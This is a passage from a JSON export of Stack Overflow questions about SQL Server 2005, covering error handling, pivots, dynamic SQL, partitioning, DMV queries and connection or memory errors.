Batch - Need that Passed to Calling Application","body":"<p>I have been researching the TRY/CATCH block and I am a little stumped on how to pass an error the way I need to do so.  From what I have read and if I understand correctly, a RAISERROR in a CATCH block in SQL will be passed to the calling batch OR the calling application.  The application is running a stored procedure which has a transaction in it.  The transaction is wrapped in a TRY/CATCH block.  In the CATCH block, I am raising the error if something in the transaction fails causing it to jump to CATCH. If running the procedure via SSMS, the error shows up fine and the transaction rolls back.  However, if the application calls the stored procedure and the same error occurs, the application never knows about the error and thus doesn't now the procedure failed.</p>\n\n<p>First of all, am I understanding correctly how the RAISERROR in CATCH works?  If so, how can I get that error raised back to the calling application?</p>\n\n<pre><code>BEGIN TRY \n    BEGIN TRAN \n        ............... \n    COMMIT \nEND TRY \nBEGIN CATCH \n    IF @@TRANCOUNT &gt; 0 \n        ROLLBACK \n    DECLARE @ErrMsg NVARCHAR(4000) \n    SELECT @ErrMsg = ERROR_MESSAGE() \n    RAISERROR(@ErrMsg, 16, 1) \nEND CATCH \n</code></pre>\n\n<p>I am Running Windows 7, SQL Server 2005</p>\n"},{"tags":["sql-server-2005","pivot"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2747,"score":1,"question_id":1047498,"title":"Rows to Columns using Sql Query","body":"<p>hi i have a table with columns as</p>\n\n<pre><code>              Cost     Rate\n\n              Repair   12\n              Repair   223\n              Wear     1000    \n              Wear     666\n              Fuel     500\n              Repair   600\n              Fuel     450\n              Wear     400\n</code></pre>\n\n<p>Now i want this data as</p>\n\n<pre><code>             Repair    Wear   Fuel\n               825     2066    950\n</code></pre>\n\n<p>Using Sql Query</p>\n\n<p>Thanks in advance      </p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":881,"score":2,"question_id":379962,"title":"How to pivot my data with SQL Server 2005","body":"<p>I have the following data</p>\n\n<p><img src=\"http://i41.tinypic.com/swr04y.jpg\" alt=\"alt text\" /></p>\n\n<p>How do I transform it (with SQL Server 2005) into the following format?</p>\n\n<p><img src=\"http://i41.tinypic.com/339u9tw.jpg\" alt=\"alt text\" /></p>\n\n<p>I have a example solution that I came up with but it seems a little clunky.  It smells perhaps?</p>\n\n<pre><code>DECLARE @ProductLanguage TABLE\n(\n    [PRODUCT_ID] int\n    , [LANGUAGE] varchar(50)\n)\n\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'Czech')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'English')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52035,'German')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'Danish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'Spanish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (54001,'English')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Finnish')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Greek')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (70501,'Hungarian')\nINSERT INTO @ProductLanguage ([PRODUCT_ID],[LANGUAGE]) VALUES (52044,'Hebrew')\n\nSELECT\n    PRODUCT_ID\n    ,MAX(CASE WHEN [ROW_ID]=1 THEN LANGUAGE ELSE NULL END) As LANG_1\n    ,MAX(CASE WHEN [ROW_ID]=2 THEN LANGUAGE ELSE NULL END) As LANG_2\n    ,MAX(CASE WHEN [ROW_ID]=3 THEN LANGUAGE ELSE NULL END) As LANG_3\nFROM\n    (SELECT\n        ROW_NUMBER() OVER (PARTITION BY [PRODUCT_ID] ORDER BY [PRODUCT_ID] ASC) AS [ROW_ID]\n        , [PRODUCT_ID]\n        , [LANGUAGE]\n    FROM\n        @ProductLanguage) AS Temp\nGROUP BY\n    [PRODUCT_ID]\n</code></pre>\n\n<p>The interesting bit is I do not care about the specific Languages displayed in each LANG_* column.  Other questions posted here seem to all refer to knowning the pivoted columns by name. But I do not want to name the columns by the languages found.</p>\n\n<p><strong>NOTE</strong>:\nI know I mention the word \"pivot\" but the best solution for this problem may not involve the PIVOT clause.  I just used that word as my question seemed to suggest pivotting data.\nMaybe a CTE would help with the solution, I do not know.  I just know I am not happy about the example solution above.</p>\n"},{"tags":["sql-server-2005","service"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12523282,"title":"Sql service could not be started","body":"<p>Please advise me on this issue:</p>\n\n<p>I have one default SQL instance in SQL Server 2005(sp 3 x64 bits) called instanceA\nThen I installed another 2 instances call instanceB and C.</p>\n\n<p>After that I restore master.bak from production server to this instanceB. The SQL services for  this instance could not be started at all since then. If I turned off the default instance services, instanceB can be started. This is because both of the instances are pointing to the same 'model.mdf' file in 'MSSQL.1' folder. Hence both instances could not be started simultaneously.</p>\n\n<p>I believe that in production server, the model path is configured to the default folder 'MSSQL.1' .Is there anyway to change the path to 'MSSQL.8' that belongs to instanceB upon installation so that both instances A and B could be started together?</p>\n\n<p>Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":42,"score":1,"question_id":9309228,"title":"Filtering with foreign key","body":"<p>I have three tables <code>tblClients</code>, <code>tblClientsActivities</code> and <code>tblActivities</code></p>\n\n<p><code>tblClients</code> and <code>tblClientsActivities</code> are joined together to produce Table A below</p>\n\n<pre><code>SELECT * from tblClientsActivities \nleft join tblclients on tblClientsActivities.fk_cid=tblclients.pk_cid\n\nPK_AID      FK_CID     FK_AID\n1             4          1   \n2             4          2\n3             4          4\n4             5          1\n5             5          3\n6             5          5\n7             6          1\n8             6          2\n9             7          6\n10            8          3\n</code></pre>\n\n<p>The problem is how do i remove all clients where FK_AID &lt;> 1</p>\n"},{"tags":["sql-server-2005","index"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":56,"score":-2,"question_id":11530839,"title":"Why we should create noncluster index on foreign key table and cluster index in primary key table","body":"<p>Why we should create noncluster index on foreign key table and cluster index in primary key table.\ni have read many topic on index but i have never understand why we should create noncluster index on foreign key table and cluster index in primary key table.\nwhy one cluster index for a table and 249 for noncluster index.</p>\n"},{"tags":["sql-server-2005","database-performance","dmv"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":113,"score":0,"question_id":12519763,"title":"CPU Time spent for each sql server session using DMVs?","body":"<p>Is there a way to get the CPU Time for each session or for every open connection in SQL Server 2005 using DMVs? I have kind of tried various combinations of  sys.dm_exec_query_stats, sys.dm_exec_connections, sys.dm_exec_sessions. Am i missing some other obvious way to get this same information? My environment is a SQL Server 2005 with about 100 databases where one database takes about 40% CPU (found using query below) and I am trying to figure out whats (number of connections, what queries, etc..) is taking it upto 40%.</p>\n\n<p>This script gives CPU time for each Database. I just need to break it down to Session OR at least at the Connection level.</p>\n\n<pre><code>WITH DB_CPU_Stats\nAS\n(SELECT DatabaseID, DB_Name(DatabaseID) AS [DatabaseName], \n  SUM(total_worker_time) AS [CPU_Time_Ms]\n FROM sys.dm_exec_query_stats AS qs\n CROSS APPLY (SELECT CONVERT(int, value) AS [DatabaseID] \n              FROM sys.dm_exec_plan_attributes(qs.plan_handle)\n              WHERE attribute = N'dbid') AS F_DB\n GROUP BY DatabaseID)\nSELECT ROW_NUMBER() OVER(ORDER BY [CPU_Time_Ms] DESC) AS [row_num],\n       DatabaseName, [CPU_Time_Ms], \n       CAST([CPU_Time_Ms] * 1.0 / SUM([CPU_Time_Ms]) \n       OVER() * 100.0 AS DECIMAL(5, 2)) AS [CPUPercent]\nFROM DB_CPU_Stats\nWHERE DatabaseID &gt; 4 -- system databases\nAND DatabaseID &lt;&gt; 32767 -- ResourceDB\nORDER BY row_num\n</code></pre>\n\n<p>Appreciate if you could provide a working sample. </p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>Modified the query above - Is this good enough? Just want someone to validate...</p>\n\n<pre><code>WITH DB_CPU_Stats\nAS\n(SELECT DatabaseID, DB_Name(DatabaseID) AS [DatabaseName], sql_handle,\n  SUM(total_worker_time) AS [CPU_Time_Ms]\n FROM sys.dm_exec_query_stats AS qs\n CROSS APPLY (SELECT CONVERT(int, value) AS [DatabaseID] \n              FROM sys.dm_exec_plan_attributes(qs.plan_handle)\n              WHERE attribute = N'dbid') AS F_DB\n GROUP BY DatabaseID, sql_handle\n)\n\n\nSELECT ROW_NUMBER() OVER(ORDER BY [CPU_Time_Ms] DESC) AS [row_num],\n       DatabaseName, [CPU_Time_Ms],  text, count(1) as Connections,\n       CAST([CPU_Time_Ms] * 1.0 / SUM([CPU_Time_Ms]) \n       OVER() * 100.0 AS DECIMAL(5, 2)) AS [CPUPercent]\nFROM DB_CPU_Stats\ncross apply sys.dm_exec_sql_text(sql_handle) C\njoin sys.dm_exec_connections CON on CON.most_recent_sql_handle = sql_handle\nWHERE DatabaseID &gt; 4 -- system databases\nAND DatabaseID &lt;&gt; 32767 -- ResourceDB\nGROUP BY CPU_Time_Ms, DatabaseName, text\nORDER BY row_num\n</code></pre>\n\n<p>Is the most_recent_handle of dm_exec_connections, supposed to map to sql_handle of dm_exec_query_text?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","where-clause"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":111,"score":3,"question_id":12509432,"title":"How to use WHERE clauses to optimise SQL query","body":"<p>I have a very simple query. </p>\n\n<pre><code>SELECT top 100 *\nFROM logs\nWHERE description LIKE '%5488826%'\nORDER BY id DESC\n</code></pre>\n\n<p>However it contains a LIKE clause which is searching a largish text field.</p>\n\n<p>I know the table only has (for example) 200200 rows </p>\n\n<p>(I'm only interested in finding something that happened in a row id > 200000).  </p>\n\n<p>I <em>tried</em> to optimise the query by adding in</p>\n\n<pre><code> SELECT top 100 *\n FROM logs\n WHERE  ID &gt; 200000 \n AND description LIKE '%5488826%'\n ORDER BY id DESC\n</code></pre>\n\n<p>my thinking was that SQL would run the <code>ID &gt; 200000</code> constraint first and that would help speed up the query, but it still takes minutes to run, what should I do to make this run faster. </p>\n\n<p>EDIT:\nID is PK and indexed</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12516151,"title":"joining scalar valued function to a table taking that column generated by SVF as in input","body":"<p>i have scalar valued function which is called and it gives a new column values  in the table, now I want to join this new column value  to a column of new table which I have added as derived table in sql server 2005.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":12507472,"title":"Auto Increment in SQL server 2005","body":"<p>How to add auto incrementing property to primary key of a table in Sql Server 2005 ?\nI have ProductID as primary key. I want to increment its value by 1 everytime a record is added. I didn't use IDENTITY keyword while creating table.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12510050,"title":"How to get NT_Username using sql query when database is logged in under SQL Server authentication","body":"<p>I have logged in using SQL Server authentication, I want to retrieve the windows username using SQL query.</p>\n\n<p>I tried using SYSTEM_USER and SUSER_NAME() it returns the sql logged in username and not windows NT_Username.</p>\n\n<p>Is there any way to get windows NT_username ?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":109,"score":3,"question_id":12511447,"title":"SQL Server: datetime out of range error","body":"<p>I have this query</p>\n\n<pre><code>SELECT W.NUMBER,B.NAME,Br.NAME,W.WDATE,W.REPAIRSTATUS,W.REPAIRCOST,W.REMARK\nFROM Work_Order AS W,Brands AS B,Branches AS Br\nWHERE W.BRANDID = B.ID AND W.BRANCHID = Br.ID\nAND CAST(WDATE as DATETIME)  &lt; CAST('09/18/2012' AS DATETIME)\n</code></pre>\n\n<p>and the system respond with </p>\n\n<blockquote>\n  <p><em>The conversion of a char data type to a datetime data type resulted in\n  an out-of-range datetime value.</em></p>\n</blockquote>\n\n<p>also using this query it gives the same error</p>\n\n<pre><code>SELECT W.NUMBER,B.NAME,Br.NAME,W.WDATE,W.REPAIRSTATUS,W.REPAIRCOST,W.REMARK\nFROM Work_Order AS W,Brands AS B,Branches AS Br\nWHERE W.BRANDID = B.ID AND W.BRANCHID = Br.ID\nORDER BY CAST(W.WDATE AS DATETIME)\n</code></pre>\n\n<p>WDATE is like '09/03/2012' and it is an input from jquery ui datepicker with mm/dd/yyyy date format</p>\n\n<p>Please help me I don't know how to fix it.</p>\n\n<p>I am working on SQL Server 2005.</p>\n\n<p>EDIT: I tried the same queries with another sql server 2005 and it's working fine so please how to fix this error with a sql server settings ??</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12094728,"title":"Write a SQL Log procedure","body":"<p>I need to write a simple SQL log procedure, that could be called like this:</p>\n\n<pre><code>Log(\"This is my param1 = {0}, param2 = {1} and param3('{2}')\", \n     @param1, @param2, @param3)\n</code></pre>\n\n<p>the output should be redirected to the file on SQL Server \"C:\\output.txt\"</p>\n\n<p>is it possible using such a procedure with <strong><em>variable</em></strong> number of params and how?</p>\n\n<p>perhaps I could use</p>\n\n<pre><code>exec master..xp_cmdshell 'echo created &gt; c:\\output.txt'\nexec master..xp_cmdshell 'echo appended data &gt;&gt; c:\\output.txt'\nexec master..xp_cmdshell 'echo more data &gt;&gt; c:\\output.txt'\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2484,"score":2,"question_id":7932258,"title":"Insert multiple rows into table in SQL Server","body":"<p>I am using to using SQL Server. I'm trying to figure out how to insert multiple rows with one query. </p>\n\n<p>In MySQL the query would be like this:</p>\n\n<p>Code:</p>\n\n<pre><code>INSERT INTO Mytable (Name, Number) VALUES ('Joe', 18), ('Bob', 25), ('Mike', 7);\n</code></pre>\n\n<p>I tried a query like the one above in SQL Server and it gave me an error that said: </p>\n\n<blockquote>\n  <p>Incorrect syntax near ','.</p>\n</blockquote>\n\n<p>Is there a way to do this in SQL Server? </p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":125,"score":2,"question_id":10386591,"title":"How to create Job and Schedule in SQL Server 2005","body":"<p>My problem is that i have installed SQL Server 2005 on  my Computer. And I want to create job and schedule to set my Store Procedure work automatically. But the problem is that it require me to create SSIS first. Absolutely I CAN NOT configure it. And I wonder that can I configure it on my Computer(Not Window Server just Window 7)?  And this is my SQL Server Version:</p>\n\n<pre><code>  Microsoft SQL Server Management Studio               9.00.1399.00\n  Microsoft Analysis Services Client Tools             2005.090.1399.00\n  Microsoft Data Access Components (MDAC)              6.1.7601.17514(win7sp1_rtm.101119-1850)\n  Microsoft MSXML                                      3.0 4.0 5.0 6.0 \n  Microsoft Internet Explorer                          9.0.8112.16421\n  Microsoft .NET Framework                             2.0.50727.5448\n  Operating System                                     6.1.7601\n</code></pre>\n\n<p>Thank you in advance...</p>\n"},{"tags":["sql","sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":201,"score":0,"question_id":7988081,"title":"Alter SQL Server Partition Function?","body":"<p>I have created a Partition Function Based on DateTime DataType, below is the Script for Partition FUnction and its corresponding partition Scheme.</p>\n\n<pre><code>CREATE PARTITION FUNCTION [VZDArchiveDatePartition](datetime) AS RANGE LEFT FOR VALUES\n(N'2011-07-01T00:00:00.000', N'2011-08-01T00:00:00.000', N'2011-09-01T00:00:00.000',\n N'2011-10-01T00:00:00.000', N'2011-11-01T00:00:00.000', N'2011-12-01T00:00:00.000',\n N'2012-01-01T00:00:00.000', N'2012-02-01T00:00:00.000', N'2012-03-01T00:00:00.000',\n N'2012-04-01T00:00:00.000', N'2012-05-01T00:00:00.000', N'2012-06-01T00:00:00.000')\nGO\n\nCREATE PARTITION SCHEME [VZDArchivePartitionScheme] AS PARTITION [VZDArchiveDatePartition] TO\n([PRIMARY], [JulyFG], [AugFG], [SepFG], [OctFG], [NovFG], [DecFG], [Jan12FG],\n [Feb12FG], [Mar12FG], [Apr12FG], [May12FG], [Jun12FG])\nGO\n</code></pre>\n\n<p>In the above Partition FUnction , I have used 1 month as range value.Now I would like to alter the Partition range from Month to Quarter.\nPlease suggest how to alter the existing function which is assigned to multiple tables.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12498058,"title":"SQL Server: WHERE NOT EXISTS is not working","body":"<p>I have a table <code>Main1</code> which have 21 records and temp table  <code>@recordsToDel</code> have 20 records. \n20 Rows are identical in both tables but the following select query is not returning the missing record and delete is also not deleting it. Both table have similar columns.</p>\n\n<p>Any suggestions please?</p>\n\n<pre><code>SELECT * FROM dbo.Main1\nWHERE NOT EXISTS\n(\n    SELECT * FROM @recordsToDel\n);\n\nDELETE FROM dbo.Main1\nWHERE NOT EXISTS\n(\n    SELECT * FROM @recordsToDel\n);\n</code></pre>\n\n<p>Many Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":264,"score":3,"question_id":11669345,"title":"sql stored procedure argument as parameter for dynamic query","body":"<p>This procedure has three parameters. But when I try to execute by passing parameters it shows me an error. Please help me.</p>\n\n<pre><code>create procedure queryfunctions @Tabname varchar(150),@colname varchar(150),@valuesname varchar(150)\nas\nbegin\ndeclare @sql varchar(4000)\nselect @sql='select * from @Tabname where @colname=@valuesname'\nexec(@sql)\nend\n\nexec queryfunctions 'education','eduChildName','Revathi'\n</code></pre>\n\n<p><strong>Error :</strong> </p>\n\n<blockquote>\n  <p>Msg 1087, Level 15, State 2, Line 1\n          Must declare the table variable \"@Tabname\".</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","reporting-services"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":1177206,"title":"Reporting services in Sqlserver","body":"<p>i know crystal reports very well and i work on this for last 3 years. \nI wanted to learn Reporting services of sqlserver so which is the best resource to learn the\nReporting services quickly ?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":125,"score":1,"question_id":12501766,"title":"SQL query ; horizontal to vertical","body":"<p>I'm stuck with a SQL query (SQL Server) that involves converting horizontal rows to vertical rows</p>\n\n<p>Below is my data</p>\n\n<pre><code>No      Flag_1    Flag_2    Flag_3\n---      ----      -----     -----\nA         1         2         3\nB         4         1         6\n</code></pre>\n\n<p>After conversion , the table should be </p>\n\n<pre><code>No     FlagsName    Flag_value\n--      ----        ----------\nA        Flag_1        1\nA        Flag_2        2  \nA        Flag_3        3\nB        Flag_1        4\nB        Flag_2        1\nB        Flag_3        6\n</code></pre>\n\n<p>Any input on this would be helpful?</p>\n\n<p>I'm trying to play around <code>ROW_NUMBER</code> over partition. but it is not working somehow !!!</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":8,"favorite_count":2,"up_vote_count":16,"down_vote_count":0,"view_count":27798,"score":16,"question_id":1492411,"title":"SQL Server - SELECT FROM stored procedure","body":"<p>I have a stored procedure that returns rows:</p>\n\n<pre><code>CREATE PROCEDURE MyProc\nAS\nBEGIN\n    SELECT * FROM MyTable\nEND\n</code></pre>\n\n<p>My actual procedure is a little more complicated, which is why a sproc is necessary.</p>\n\n<p>Is it possible to select the output by calling this procedure?</p>\n\n<p>Something like:</p>\n\n<pre><code>SELECT * FROM (EXEC MyProc) AS TEMP\n</code></pre>\n\n<p>I need to use <code>SELECT TOP X</code>, <code>ROW_NUMBER</code>, and an additional <code>WHERE</code> clause to page my data, and I don't really want to pass these values as parameters.</p>\n"},{"tags":["java","sql-server-2005","tomcat6","outofmemoryerror","32bit"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":12498752,"title":"Java out of memory error when using MS SQL 2005 DB with Tomcat 6","body":"<p>I am working on a java based web app that uses Tomcat 6 as the web server. Normally, we have a MySQL backend, but for a few instances we need to use MS SQL to serve our clients. When performing our latest upgrade to one of these MS SQL instances, I began getting java out of memory errors when accessing certain pages of the web app. Usually occurring when returning a larger result set, but not always.</p>\n\n<p>I do not receive this error on the same web app set-up as a local instance on my PC, which leads me to believe that this is an environment issue. I have tried numerous different Java settings in the Tomcat 6 configuration without any luck fixing the issue. </p>\n\n<p>The environment is a 32-bit machine with 4GB of RAM. \nI have configured Tomcat 6 with the following:\n-XX:MaxPermSize=512m\n-Xnoclassgc\nInitial memory pool: 1024\nMaximum memory pool: 1024</p>\n\n<p>I have also tried increasing the MaxPermSize, but this causes Tomcat to not be able to start.</p>\n\n<p>As well, I have tried setting -Xms -Xmx, to 256m each, 512m each, etc.</p>\n\n<p>My local machine is 64-bit with 4GB RAM.\nI have configured Tomcat 6 with the following:\n-XX:MaxPermSize=512m\n-Xnoclassgc\nInitial memory pool: 1024\nMaximum memory pool: 1024</p>\n\n<p>Could this be an issue with an SQL statement in the new upgrade? \nI don't don't believe this is the case because the error does not happen on my local instance. I believe it's environment related, but can't figure out the issue.</p>\n\n<p>Does anyone have any advice?</p>\n\n<p>Here is the logged error: </p>\n\n<pre><code>2012-09-19 11:44:54,745 [ http-80-7] ERROR org.apache.jsp.siteManager.util.error_jsp: javax.servlet.ServletException: java.lang.OutOfMemoryError: unable to create new native thread\nat org.apache.jasper.runtime.PageContextImpl.doHandlePageException(PageContextImpl.java:862)\nat org.apache.jasper.runtime.PageContextImpl.handlePageException(PageContextImpl.java:791)\nat org.apache.jsp.doc.doc.index_jsp._jspService(index_jsp.java:1106)\nat org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\nat org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\nat org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)\nat org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:436)\nat org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:374)\nat org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:302)\nat com.djinnsoft.jade.sitetree.Sitetree.forward(Sitetree.java:405)\nat com.djinnsoft.jade.sitetree.Sitetree.forward(Sitetree.java:344)\nat com.djinnsoft.jade.sitetree.RootServlet.service(RootServlet.java:124)\nat javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat com.springboard.ram.report.ReportSecurityFilter.doFilter(ReportSecurityFilter.java:70)\nat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\nat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\nat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)\nat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)\nat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)\nat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)\nat org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555)\nat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)\nat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)\nat org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:861)\nat org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:579)\nat org.apache.tomcat.util.net.AprEndpoint$Worker.run(AprEndpoint.java:1584)\nat java.lang.Thread.run(Unknown Source)\nCaused by: java.lang.OutOfMemoryError: unable to create new native thread\nat java.lang.Thread.start0(Native Method)\nat java.lang.Thread.start(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TimeoutTimer.start(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.doExecuteStatement(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement$StmtExecCmd.doExecute(Unknown Source)\nat com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(Unknown Source)\nat com.microsoft.sqlserver.jdbc.SQLServerStatement.executeQuery(Unknown Source)\nat org.apache.tomcat.dbcp.dbcp.DelegatingStatement.executeQuery(DelegatingStatement.java:208)\nat org.apache.tomcat.dbcp.dbcp.DelegatingStatement.executeQuery(DelegatingStatement.java:208)\nat com.djinnsoft.jade.data.record.SQLUtil.ExecuteQuery(SQLUtil.java:236)\nat com.djinnsoft.jade.data.record.SQLUtil.ExecuteQuery(SQLUtil.java:207)\nat com.djinnsoft.jade.data.record.RecordSource.find(RecordSource.java:184)\nat com.djinnsoft.jade.data.record.RecordSource.find(RecordSource.java:148)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.createVersions(DatabaseContentSource.java:804)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.access$2900(DatabaseContentSource.java:42)\nat com.djinnsoft.jade.content.data.DatabaseContentSource$8.process(DatabaseContentSource.java:747)\nat com.djinnsoft.jade.data.record.SQLEnvironment.execute(SQLEnvironment.java:70)\nat com.djinnsoft.jade.content.data.DatabaseContentSource.findImpl(DatabaseContentSource.java:672)\nat com.djinnsoft.jade.content.GenericContentSource.findImpl(GenericContentSource.java:1077)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1186)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1200)\nat com.djinnsoft.jade.content.GenericContentSource.find(GenericContentSource.java:1025)\nat com.djinnsoft.jade.content.taglib.ContentBaseTag.findItem(ContentBaseTag.java:166)\nat com.djinnsoft.jade.content.taglib.ContentTag.doStartTag(ContentTag.java:500)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_content_005faction_005f12(index_jsp.java:7637)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fforEach_005f6(index_jsp.java:6299)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fotherwise_005f3(index_jsp.java:4816)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fchoose_005f3(index_jsp.java:4395)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fotherwise_005f2(index_jsp.java:4363)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_c_005fchoose_005f2(index_jsp.java:4278)\nat org.apache.jsp.doc.doc.index_jsp._jspx_meth_forms_005fpopulateResult_005f0(index_jsp.java:4244)\nat org.apache.jsp.doc.doc.index_jsp._jspService(index_jsp.java:961)\n... 32 more\n</code></pre>\n"},{"tags":["sql-server","visual-studio-2010","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12465279,"title":"VS2010: Bad IL Range error","body":"<p>I'm attempting to connect to a database via the \"Add Connection\" in VS2010.  The database is running SQL2005, and is accessible in VS2008.   When I attempt to connect in VS2010 I receive the following error:<p></p>\n\n<blockquote>\nUnable to add data connection.<br>\nFailed to retrieve data for this request.<br>\nException has been thrown by the target of an invocation.<br>\nBad IL range.<br>\n</blockquote>\n\n<p>Oddly the \"Test connection\" works fine. <br>\nI've attempted to re-initialize VS2010 via the registry with no luck. Am looking for any suggestions as to the cause, or where I can look next, to find the root cause. <p>\nAdditional Info<br>\nI have noticed in the system event log 2 errors when I attempt to attach to a database: <br>\n1) The following fatal alert was generated: 48. The internal error state is 552.  and <br>\n2) The certificate received from the remote server was issued by an untrusted certificate authority. Because of this, none of the data contained in the certificate can be validated. The SSL connection request has failed. The attached data contains the server certificate.<p></p>\n\n<p>I've attempted to uninstall and re-install VS2010. No luck.  Attempting to connect on another machine seems to work, but my main development machine continues to fail with the error(s) noted above.   I'd prefer not to have to reformat my machine, and am desperate to find an answer or reasonable course of action to find the problem...  help!</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12500032,"title":"Nested If in stored proc causing syntax error","body":"<p>I am creating a stored 